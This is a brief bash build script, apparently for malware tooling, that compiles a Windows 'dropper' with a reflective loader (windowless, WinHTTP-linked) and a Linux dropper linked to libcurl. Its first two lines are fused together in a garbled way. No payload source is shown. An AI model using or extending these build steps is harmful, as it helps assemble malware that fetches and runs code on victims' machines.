#!/bin/bash
gcc -m64 -Os dropper.c reflective_loader.c -o dropper.exe -lwinhttp -lole32 -Wl,--subsystem,windows#!/bin/bash
# Build Windows dropper (using MinGW)
x86_64-w64-mingw32-gcc -m64 -Os dropper_win.c reflective_loader.c -o dropper.exe -lwinhttp -lole32 -Wl,--subsystem,windows
# Build Linux dropper
gcc -o dropper_linux dropper_linux.c -lcurl